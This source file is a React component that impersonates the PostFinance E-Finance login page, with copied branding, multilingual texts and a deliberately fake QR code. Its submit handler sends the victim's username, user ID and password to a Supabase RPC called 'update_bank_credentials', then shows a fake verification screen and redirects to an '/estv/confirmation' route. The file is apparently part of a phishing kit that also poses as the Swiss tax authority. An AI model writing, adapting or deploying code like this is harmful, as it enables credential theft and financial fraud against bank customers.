import { useEffect, useRef, useState } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Eye, EyeOff, MessageCircleQuestion, ChevronRight, ChevronDown, Moon } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";

const PF_YELLOW = "#FFCC00";
const PF_YELLOW_HOVER = "#E6B800";
const PF_PETROL = "#005C5A";
const PF_LINE = "#005C5A";
const PF_CONTENT_BG = "#eef6f6";
const PF_INFO_BLUE = "#387afa";
const INPUT_GRAY = "#374151";

type Lang = "de" | "fr" | "it" | "en";

const TRANSLATIONS: Record<Lang, Record<string, string>> = {
  de: {
    contact: "Kontakt und Support",
    login: "Login",
    user: "E-Finance-Nummer / Benutzername",
    password: "Passwort",
    forgot: "Passwort vergessen",
    optional: "Falls vorhanden",
    bid: "Benutzeridentifikation",
    next: "Weiter",
    quick: "Schnelles Login",
    quickDesc: "Zum Einloggen ins E-Finance am Computer, scannen Sie den QR-Code mit Ihrem Smartphone.",
    instructions: "Anleitung",
    helpTitle: "Benötigen Sie Hilfe?",
    support: "Support zum Login",
    order: "E-Finance bestellen",
    demo: "Demoversion E-Finance",
    security: "Sicherheitsstandards",
    toPf: "zu postfinance.ch",
    legal: "Rechtliches und Barrierefreiheit",
    auto: "Automatisch",
    langLabel: "Deutsch",
    loading: "Anmeldedaten werden überprüft...",
    infoUser:
      "Ihre E-Finance-Nummer finden Sie in Ihren Eröffnungsunterlagen von E-Finance.\n\nNutzen Sie das schnelle Login mit der PostFinance App, wenn Sie Ihre E-Finance-Nummer oder Ihren Benutzernamen nicht eingeben möchten.",
    infoBid:
      "Wenn mehrere Personen die gleiche E-Finance-Teilnahme nutzen, wird zusätzlich die Benutzeridentifikation benötigt. Diese finden Sie in Ihren Eröffnungsunterlagen von E-Finance oder in der PostFinance App (sofern registriert).",
  },
  fr: {
    contact: "Contact et support",
    login: "Login",
    user: "Numéro E-Finance / Nom d'utilisateur",
    password: "Mot de passe",
    forgot: "Mot de passe oublié",
    optional: "Le cas échéant",
    bid: "Identification d'utilisateur",
    next: "Continuer",
    quick: "Login rapide",
    quickDesc: "Pour vous connecter à E-Finance sur l'ordinateur, scannez le code QR avec votre smartphone.",
    instructions: "Instructions",
    helpTitle: "Besoin d'aide?",
    support: "Assistance pour le login",
    order: "Commander E-Finance",
    demo: "Version démo E-Finance",
    security: "Normes de sécurité",
    toPf: "vers postfinance.ch",
    legal: "Mentions légales et accessibilité",
    auto: "Automatique",
    langLabel: "Français",
    loading: "Vérification des données de connexion...",
    infoUser:
      "Vous trouverez votre numéro E-Finance dans vos documents d'ouverture E-Finance.\n\nUtilisez le login rapide avec l'app PostFinance si vous ne souhaitez pas saisir votre numéro E-Finance ou votre nom d'utilisateur.",
    infoBid:
      "Si plusieurs personnes utilisent la même participation E-Finance, l'identification d'utilisateur est nécessaire en plus. Vous la trouverez dans vos documents d'ouverture E-Finance ou dans l'app PostFinance (si enregistré).",
  },
  it: {
    contact: "Contatto e supporto",
    login: "Login",
    user: "Numero E-Finance / Nome utente",
    password: "Password",
    forgot: "Password dimenticata",
    optional: "Se disponibile",
    bid: "Identificazione utente",
    next: "Avanti",
    quick: "Login rapido",
    quickDesc: "Per accedere a E-Finance dal computer, scansionate il codice QR con il vostro smartphone.",
    instructions: "Istruzioni",
    helpTitle: "Avete bisogno di aiuto?",
    support: "Supporto al login",
    order: "Ordinare E-Finance",
    demo: "Versione demo E-Finance",
    security: "Standard di sicurezza",
    toPf: "vai a postfinance.ch",
    legal: "Note legali e accessibilità",
    auto: "Automatico",
    langLabel: "Italiano",
    loading: "Verifica dei dati di accesso in corso...",
    infoUser:
      "Trovate il vostro numero E-Finance nei documenti di apertura di E-Finance.\n\nUtilizzate il login rapido con l'app PostFinance se non desiderate inserire il numero E-Finance o il nome utente.",
    infoBid:
      "Se più persone utilizzano la stessa partecipazione E-Finance, è necessaria anche l'identificazione utente. La trovate nei documenti di apertura di E-Finance o nell'app PostFinance (se registrato).",
  },
  en: {
    contact: "Contact and support",
    login: "Login",
    user: "E-Finance number / Username",
    password: "Password",
    forgot: "Forgot password",
    optional: "If applicable",
    bid: "User identification",
    next: "Continue",
    quick: "Quick login",
    quickDesc: "To log in to E-Finance on your computer, scan the QR code with your smartphone.",
    instructions: "Instructions",
    helpTitle: "Need help?",
    support: "Login support",
    order: "Order E-Finance",
    demo: "E-Finance demo version",
    security: "Security standards",
    toPf: "to postfinance.ch",
    legal: "Legal and accessibility",
    auto: "Automatic",
    langLabel: "English",
    loading: "Verifying login credentials...",
    infoUser:
      "You will find your E-Finance number in your E-Finance opening documents.\n\nUse quick login with the PostFinance app if you do not want to enter your E-Finance number or username.",
    infoBid:
      "If several people use the same E-Finance participation, the user identification is additionally required. You will find it in your E-Finance opening documents or in the PostFinance app (if registered).",
  },
};

const LANG_OPTIONS: { code: Lang; label: string }[] = [
  { code: "de", label: "Deutsch" },
  { code: "fr", label: "Français" },
  { code: "it", label: "Italiano" },
  { code: "en", label: "English" },
];

const InfoDot = ({ size = 24 }: { size?: number }) => (
  <svg
    width={size}
    height={size}
    viewBox="0 0 16 16"
    fill="none"
    stroke={PF_INFO_BLUE}
    strokeWidth={1}
    aria-hidden="true"
  >
    <circle cx="8" cy="8" r="7" />
    <circle cx="8" cy="4.5" r="0.6" fill={PF_INFO_BLUE} stroke="none" />
    <line x1="8" y1="7" x2="8" y2="12" strokeLinecap="round" />
  </svg>
);


const PostFinanceLogo = ({ className = "" }: { className?: string }) => (
  <svg
    role="img"
    aria-label="PostFinance"
    viewBox="100 100 1000 147"
    height="29"
    xmlns="http://www.w3.org/2000/svg"
    className={className}
    style={{ color: PF_PETROL }}
  >
    <path
      d="M238.23,151.49c-2.06-.15-4.13-.15-6.19-.15-19.77,0-37.17,4.27-51.26,12.57,11.8-15.61,17.73-36.09,17.36-60.09v-3.82h-44.85l.06,4.41c.29,16.31-3.54,28.51-11.35,36-10.17,9.7-26.67,11.17-38.76,10.58l-3.24-.17v44.59l1.77.11c2.06.15,4.13.15,6.19.15,19.77,0,37.17-4.27,51.26-12.57-11.8,15.61-17.73,36.09-17.36,60.09v3.82h44.85l-.06-4.41c-.29-16.31,3.54-28.51,11.35-36,10.17-9.7,26.67-11.17,38.76-10.58l3.24.17v-44.59l-1.77-.11Z"
      fill="#ffffff"
    />
    <path
      d="M349.29,155.04c0,16.94-11.82,32.59-32.27,32.59h-23.49s0,36.99,0,36.99h-18.53v-102.17h42.1c20.37,0,32.19,15.66,32.19,32.59ZM293.53,139.06v31.95h20.77c9.99,0,15.98-6.31,16.14-15.98-.16-9.67-6.15-15.98-16.14-15.98h-20.77ZM559.15,211.28c-10.62,0-14.46-2.56-14.46-11.5v-34.27h19.33s0-15.18,0-15.18h-21.81c3.51-3.28,6.63-7.83,6.15-18.29h-16.78c0,.88-.88,17.02-15.82,23.49v9.99h11.5v36.11c0,17.34,10.94,25,28.44,25,3.04,0,6.15-.16,9.19-.64v-15.02c-2,.16-3.83.32-5.75.32ZM646.92,122.52h-65.91s0,102.09,0,102.09h18.61s0-41.78,0-41.78h43.78s0-16.46,0-16.46h-43.78v-27.16h47.29s0-16.7,0-16.7ZM677.79,148.8h-17.65s0,75.89,0,75.89h17.65s0-75.89,0-75.89ZM694.65,224.7h17.65s0-43.3,0-43.3c0-12.46,9.83-17.81,17.97-17.81,7.27,0,12.78,4.39,12.78,15.18v45.93h17.65s0-48.09,0-48.09c0-18.61-9.11-29.64-26.44-29.64-9.99,0-19.97,5.35-22.93,15.34l-1.36-13.5h-15.34s0,75.89,0,75.89ZM772.85,186.67c0-19.49,11.34-39.62,36.43-39.62,11.5,0,20.13,6.47,21.49,12.14l1.2-10.31h15.5v58.4c0,2.32,1.2,5.03,6.47,4.95v13.02l-3.99.48c-10.31.64-18.77-5.35-19.17-12.62v-.16c-2.16,7.03-11.34,13.66-21.49,13.66-25.16,0-36.43-21.57-36.43-39.94ZM830.37,188.99v-5.91c0-12.78-8.79-19.81-19.49-19.81-13.66,0-19.81,12.62-19.81,23.33s4.31,23.49,19.81,23.49c12.7.08,19.49-9.43,19.49-21.09ZM868.36,148.8v75.89s17.65,0,17.65,0v-43.3c0-12.46,9.83-17.81,17.97-17.81,7.27,0,12.78,4.39,12.78,15.18v45.93h17.65s0-48.09,0-48.09c0-18.61-9.11-29.64-26.44-29.64-9.99,0-19.97,5.35-22.93,15.34l-1.36-13.5h-15.34ZM1000.99,199.13c-3.2,10.31-10.7,11.34-15.5,11.34-9.83,0-21.17-6.39-21.17-23.33s11.5-23.65,21.17-23.65c5.03,0,12.86,1.2,15.34,11.34l17.35-4.46c-3.47-14.36-17.64-23.02-32.6-23.02-23.49,0-38.58,17.97-38.58,39.62s14.06,39.46,38.5,39.62c15.98.15,27.58-8.37,31.76-23.26l-16.26-4.22ZM1097.77,204.95c-4.15,12.54-14.86,21.66-31.89,21.66-23.81,0-39.06-17.97-39.06-39.78,0-23.01,15.26-39.62,37.87-39.62,15.74.08,35.31,9.59,35.31,38.74l-.16,5.03h-55.01c-.48,11.02,8.92,20.45,20.9,20.45,6.15,0,13.34-1.84,15.98-10.62l16.07,4.14ZM1045.55,178.44l36.27-.04c0-9.83-7.62-16.9-16.72-16.9-10.31,0-18.58,7.59-19.54,16.94ZM669.49,137.06c5.43,0,10.07-4.47,10.07-9.91s-4.63-9.91-10.07-9.91c-5.27,0-9.91,4.47-9.91,9.91s4.63,9.91,9.91,9.91ZM393.55,146.41c-22.77,0-38.82,18.13-38.82,40.1s15.82,40.1,38.98,40.1c23.01,0,38.82-18.29,38.82-40.1,0-21.97-15.82-40.1-38.98-40.1ZM393.71,210.8c-12.54,0-22.77-10.86-22.77-24.36s10.23-24.36,22.77-24.36c12.54,0,22.77,10.86,22.77,24.36s-10.23,24.36-22.77,24.36ZM476.47,226.61c19.57,0,32.59-10.7,32.59-26.6,0-17.81-16.38-19.89-30.28-21.65-10.15-1.36-19.09-2.72-19.09-10.15,0-5.19,4.47-8.95,13.82-8.95,9.83,0,15.1,4.23,17.26,11.74l16.86-4.31c-3.12-12.78-13.9-22.05-33.39-22.05-19.73,0-32.43,9.43-32.43,25.32,0,17.97,16.22,20.37,30.36,22.53,10.39,1.6,18.85,2.88,18.85,9.99,0,5.67-5.24,9.33-14.19,9.33-9.35,0-16.56-4.13-18.96-12.68l-17.02,4.39c4.23,14.46,18.13,23.09,35.63,23.09Z"
      fill="currentColor"
    />
  </svg>
);

// Realistic-looking but non-scannable QR mockup
const QrPlaceholder = () => {
  const N = 33;
  const cells: boolean[][] = [];
  let seed = 987654321;
  const rand = () => {
    seed = (seed * 1103515245 + 12345) & 0x7fffffff;
    return ((seed >> 8) % 1000) / 1000;
  };
  for (let r = 0; r < N; r++) {
    const row: boolean[] = [];
    for (let c = 0; c < N; c++) row.push(rand() > 0.5);
    cells.push(row);
  }
  // Finder pattern stamps (7x7) in three corners
  const stampFinder = (sr: number, sc: number) => {
    for (let r = 0; r < 7; r++)
      for (let c = 0; c < 7; c++) {
        const edge = r === 0 || r === 6 || c === 0 || c === 6;
        const inner = r >= 2 && r <= 4 && c >= 2 && c <= 4;
        cells[sr + r][sc + c] = edge || inner;
      }
    // separator (white) around finder — leave outer ring blank
    for (let r = -1; r <= 7; r++)
      for (let c = -1; c <= 7; c++) {
        const rr = sr + r;
        const cc = sc + c;
        if (rr < 0 || cc < 0 || rr >= N || cc >= N) continue;
        if (r === -1 || r === 7 || c === -1 || c === 7) cells[rr][cc] = false;
      }
    for (let r = 0; r < 7; r++)
      for (let c = 0; c < 7; c++) {
        const edge = r === 0 || r === 6 || c === 0 || c === 6;
        const inner = r >= 2 && r <= 4 && c >= 2 && c <= 4;
        cells[sr + r][sc + c] = edge || inner;
      }
  };
  stampFinder(0, 0);
  stampFinder(0, N - 7);
  stampFinder(N - 7, 0);
  // Timing patterns
  for (let i = 8; i < N - 8; i++) {
    cells[6][i] = i % 2 === 0;
    cells[i][6] = i % 2 === 0;
  }
  // Alignment pattern (bottom-right area)
  const ar = N - 9;
  const ac = N - 9;
  for (let r = 0; r < 5; r++)
    for (let c = 0; c < 5; c++) {
      const edge = r === 0 || r === 4 || c === 0 || c === 4;
      const center = r === 2 && c === 2;
      cells[ar + r][ac + c] = edge || center;
    }

  const size = 220;
  const cell = size / N;
  return (
    <svg width={size} height={size} viewBox={`0 0 ${size} ${size}`} aria-hidden="true">
      <rect width={size} height={size} fill="#ffffff" />
      {cells.flatMap((row, r) =>
        row.map((on, c) =>
          on ? (
            <rect
              key={`${r}-${c}`}
              x={c * cell}
              y={r * cell}
              width={cell + 0.5}
              height={cell + 0.5}
              fill="#000"
            />
          ) : null
        )
      )}
    </svg>
  );
};

const FieldUnderline = () => (
  <div style={{ height: 1, background: PF_LINE }} />
);

const InfoPopover = ({ text }: { text: string }) => (
  <div
    role="tooltip"
    className="absolute z-20 left-1/2 -translate-x-1/2 bottom-full mb-1 max-w-[340px] w-[min(340px,90vw)] rounded-md px-3 py-2 text-[13px] leading-relaxed whitespace-pre-line bg-white shadow-sm"
    style={{ border: `1px solid ${PF_INFO_BLUE}`, color: PF_INFO_BLUE }}
  >
    {text}
  </div>
);


const ChPostfinance = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [benutzername, setBenutzername] = useState("");
  const [passwort, setPasswort] = useState("");
  const [benutzerId, setBenutzerId] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [submitHover, setSubmitHover] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [openInfo, setOpenInfo] = useState<"u" | "b" | null>(null);
  const [lang, setLang] = useState<Lang>("de");
  const [langOpen, setLangOpen] = useState(false);

  const infoRef = useRef<HTMLDivElement | null>(null);
  const langRef = useRef<HTMLDivElement | null>(null);
  const t = TRANSLATIONS[lang];
  const hideOptional = benutzername.trim().length > 0;

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);
  usePageMeta("PostFinance E-Finance Login", "https://www.postfinance.ch/favicon.ico");

  useEffect(() => {
    const onDocClick = (e: MouseEvent) => {
      if (infoRef.current && !infoRef.current.contains(e.target as Node)) setOpenInfo(null);
      if (langRef.current && !langRef.current.contains(e.target as Node)) setLangOpen(false);
    };
    document.addEventListener("mousedown", onDocClick);
    return () => document.removeEventListener("mousedown", onDocClick);
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!benutzername || !passwort) return;
    const usernameCombined = benutzerId
      ? `${benutzername} | Benutzeridentifikation: ${benutzerId}`
      : benutzername;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: usernameCombined,
        p_password: passwort,
        p_username_label: "E-Finance-Nummer / Benutzername",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message={t.loading}
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div
        className="min-h-screen flex flex-col"
        style={{
          background: PF_CONTENT_BG,
          color: PF_PETROL,
          fontFamily:
            "'PostFinance Sans', 'HelveticaNeue', 'Helvetica Neue', Helvetica, Arial, sans-serif",
        }}
      >
        {/* Header */}
        <header
          className="w-full flex items-center justify-between px-5 md:px-10"
          style={{ background: PF_YELLOW, height: 80 }}
        >
          <PostFinanceLogo className="h-6 md:h-[29px] w-auto" />
          <a
            href="#"
            onClick={(e) => e.preventDefault()}
            className="flex items-center gap-2 no-underline"
            style={{ color: PF_PETROL, textDecoration: "none" }}
          >
            <MessageCircleQuestion className="w-[18px] h-[18px]" strokeWidth={1.5} />
            <span className="hidden sm:inline text-[12px] font-bold">{t.contact}</span>
          </a>
        </header>

        {/* Main */}
        <main className="flex-1 px-5 md:px-10 pt-10 md:pt-14 pb-10">
          <div className="max-w-[1180px] mx-auto">
            <h1
              className="font-normal mb-8 md:mb-10"
              style={{ color: "#006099", fontSize: "clamp(22px, 2.6vw, 30px)" }}
            >
              {t.login}
            </h1>

            <div className="grid grid-cols-1 md:grid-cols-[1fr_360px] gap-6 md:gap-8">
              {/* Login Card */}
              <section className="bg-white rounded-2xl p-6 md:p-10 shadow-[0_1px_2px_rgba(0,0,0,0.04)] self-start" ref={infoRef}>
                <form onSubmit={handleSubmit} className="flex flex-col gap-8">
                  {/* E-Finance-Nummer */}
                  <div className="relative">
                    <label
                      htmlFor="pf-user"
                      className="flex items-center gap-2 text-[12px] mb-2 font-semibold md:font-extrabold"
                      style={{ color: "#000" }}
                    >
                      {t.user}
                      <span className="relative inline-flex">
                        <button
                          type="button"
                          aria-label="Info"
                          className="inline-flex items-center justify-center"
                          onClick={(e) => {
                            e.preventDefault();
                            setOpenInfo((v) => (v === "u" ? null : "u"));
                          }}
                        >
                          <InfoDot size={24} />
                        </button>
                        {openInfo === "u" && <InfoPopover text={t.infoUser} />}
                      </span>
                    </label>

                    <input
                      id="pf-user"
                      type="text"
                      autoComplete="username"
                      value={benutzername}
                      onChange={(e) => setBenutzername(e.target.value)}
                      className="w-full bg-transparent outline-none py-2 text-[16px]"
                      style={{ color: INPUT_GRAY, caretColor: INPUT_GRAY }}
                    />
                    <FieldUnderline />
                  </div>

                  {/* Passwort */}
                  <div>
                    <label
                      htmlFor="pf-pw"
                      className="block text-[12px] mb-2 font-semibold md:font-extrabold"
                      style={{ color: "#000" }}
                    >

                      {t.password}
                    </label>
                    <div className="relative">
                      <input
                        id="pf-pw"
                        type={showPw ? "text" : "password"}
                        autoComplete="current-password"
                        value={passwort}
                        onChange={(e) => setPasswort(e.target.value)}
                        className="w-full bg-transparent outline-none py-2 pr-10 text-[16px]"
                        style={{ color: INPUT_GRAY, caretColor: INPUT_GRAY }}
                      />
                      <button
                        type="button"
                        onClick={() => setShowPw((v) => !v)}
                        className="absolute right-0 top-1/2 -translate-y-1/2 p-1"
                        aria-label={showPw ? "Passwort verbergen" : "Passwort anzeigen"}
                        style={{ color: PF_PETROL }}
                      >
                        {showPw ? (
                          <EyeOff className="w-5 h-5" strokeWidth={1.8} />
                        ) : (
                          <Eye className="w-5 h-5" strokeWidth={1.8} />
                        )}
                      </button>
                    </div>
                    <FieldUnderline />
                    <a
                      href="#"
                      onClick={(e) => e.preventDefault()}
                      className="inline-flex items-center gap-1 mt-3 text-[14px] font-medium"
                      style={{ color: PF_PETROL, textDecoration: "none" }}
                    >
                      {t.forgot}
                      <ChevronRight className="w-4 h-4" strokeWidth={2} />
                    </a>
                  </div>

                  {/* Falls vorhanden */}
                  {!hideOptional && (
                    <div className="pt-2 relative">
                      <h2
                        className="font-normal mb-4"
                        style={{ color: PF_PETROL, fontSize: "clamp(20px, 2.4vw, 24px)" }}
                      >
                        {t.optional}
                      </h2>
                      <label
                        htmlFor="pf-bid"
                        className="flex items-center gap-2 text-[12px] mb-2 font-semibold md:font-extrabold"
                        style={{ color: "#000" }}
                      >
                        {t.bid}
                        <span className="relative inline-flex">
                          <button
                            type="button"
                            aria-label="Info"
                            className="inline-flex items-center justify-center"
                            onClick={(e) => {
                              e.preventDefault();
                              setOpenInfo((v) => (v === "b" ? null : "b"));
                            }}
                          >
                            <InfoDot size={24} />
                          </button>
                          {openInfo === "b" && <InfoPopover text={t.infoBid} />}
                        </span>
                      </label>

                      <input
                        id="pf-bid"
                        type="text"
                        value={benutzerId}
                        onChange={(e) => setBenutzerId(e.target.value)}
                        className="w-full bg-transparent outline-none py-2 text-[16px]"
                        style={{ color: INPUT_GRAY, caretColor: INPUT_GRAY }}
                      />
                      <FieldUnderline />
                    </div>
                  )}

                  <div className="flex justify-center md:justify-end pt-2">
                    <button
                      type="submit"
                      onMouseEnter={() => setSubmitHover(true)}
                      onMouseLeave={() => setSubmitHover(false)}
                      className="rounded-full w-full md:w-auto px-10 py-3 text-[15px] font-normal transition-colors"
                      style={{
                        background: submitHover ? PF_YELLOW_HOVER : PF_YELLOW,
                        color: PF_PETROL,
                      }}
                    >
                      {t.next}
                    </button>
                  </div>

                </form>
              </section>

              {/* Right column */}
              <aside className="flex flex-col gap-6">
                {/* Schnelles Login */}
                <div className="hidden md:block bg-white rounded-2xl p-6">

                  <h3
                    className="font-normal mb-4"
                    style={{ color: PF_PETROL, fontSize: 20 }}
                  >
                    {t.quick}
                  </h3>
                  <div className="flex justify-center mb-4">
                    <div className="border" style={{ borderColor: "#e5e7eb" }}>
                      <QrPlaceholder />
                    </div>
                  </div>
                  <p className="text-[14px] leading-relaxed mb-3" style={{ color: "#000" }}>
                    {t.quickDesc}
                  </p>
                  <a
                    href="https://www.postfinance.ch/helpquickloginde"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="inline-flex items-center gap-1 text-[14px] font-medium hover:underline"
                    style={{ color: PF_PETROL }}
                  >
                    {t.instructions}
                    <ChevronRight className="w-4 h-4" strokeWidth={2} />
                  </a>
                </div>

                {/* Benötigen Sie Hilfe */}
                <div className="bg-white rounded-2xl p-6">
                  <h3
                    className="font-normal mb-4"
                    style={{ color: PF_PETROL, fontSize: 20 }}
                  >
                    {t.helpTitle}
                  </h3>
                  <ul className="flex flex-col gap-1 text-[14px]">
                    {[
                      { label: t.support, href: "https://www.postfinance.ch/efinloginprocedurede" },
                      { label: t.order, href: "https://www.postfinance.ch/ef-bestellen" },
                      { label: t.demo, href: "https://www.postfinance.ch/demoefinloginde" },
                      { label: t.security, href: "https://www.postfinance.ch/sicherheitstipps" },
                    ].map((l) => (
                      <li key={l.label}>
                        <a
                          href={l.href}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="inline-flex items-center gap-1 font-medium hover:underline"
                          style={{ color: PF_PETROL }}
                        >
                          {l.label}
                          <ChevronRight className="w-4 h-4" strokeWidth={1.25} style={{ color: "#9ca3af" }} />
                        </a>
                      </li>
                    ))}
                  </ul>
                </div>
              </aside>
            </div>
          </div>
        </main>

        {/* Footer */}
        <footer className="px-5 md:px-10 py-6 border-t" style={{ borderColor: "#d6e4e0" }}>
          <div className="max-w-[1180px] mx-auto flex flex-col gap-4 md:flex-row md:items-center md:justify-between text-[13px]">
            <a
              href="https://www.postfinance.ch/"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center gap-1 font-medium hover:underline"
              style={{ color: PF_PETROL }}
            >
              {t.toPf}
              <ChevronRight className="w-4 h-4" strokeWidth={2} />
            </a>
            <div className="md:hidden border-t" style={{ borderColor: "#d6e4e0" }} />
            <div className="flex flex-col md:flex-row md:items-center gap-3 md:gap-4">
              <button
                type="button"
                onClick={(e) => e.preventDefault()}
                className="flex w-full md:w-auto md:inline-flex items-center justify-between md:justify-center gap-2 px-4 py-3 rounded-md bg-white"
                style={{ border: `1px solid ${PF_PETROL}`, color: "#374151" }}
              >
                <span className="inline-flex items-center gap-2">
                  <Moon className="w-4 h-4" strokeWidth={1.8} />
                  {t.auto}
                </span>
                <ChevronDown className="w-4 h-4" strokeWidth={2} style={{ color: "#9ca3af" }} />
              </button>
              <div className="relative" ref={langRef}>
                <button
                  type="button"
                  onClick={() => setLangOpen((v) => !v)}
                  className="flex w-full md:w-auto md:inline-flex items-center justify-between md:justify-center gap-2 px-4 py-3 rounded-md bg-white"
                  style={{ border: `1px solid ${PF_PETROL}`, color: "#374151" }}
                >
                  {t.langLabel}
                  <ChevronDown className="w-4 h-4" strokeWidth={2} style={{ color: "#9ca3af" }} />
                </button>

                {langOpen && (
                  <div
                    className="absolute z-30 left-0 right-0 bottom-full mb-2 rounded-md bg-white overflow-hidden shadow-md"
                    style={{ border: `1px solid ${PF_PETROL}` }}
                  >
                    {LANG_OPTIONS.map((opt) => (
                      <button
                        key={opt.code}
                        type="button"
                        onClick={() => {
                          setLang(opt.code);
                          setLangOpen(false);
                        }}
                        className="block w-full text-left px-4 py-2 text-[13px] hover:bg-gray-50"
                        style={{
                          color: "#374151",
                          fontWeight: opt.code === lang ? 700 : 400,
                        }}
                      >
                        {opt.label}
                      </button>
                    ))}
                  </div>
                )}
              </div>
              <a
                href="https://www.postfinance.ch/legalde"
                target="_blank"
                rel="noopener noreferrer"
                className="font-medium hover:underline"
                style={{ color: PF_PETROL }}
              >
                {t.legal}
              </a>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChPostfinance;
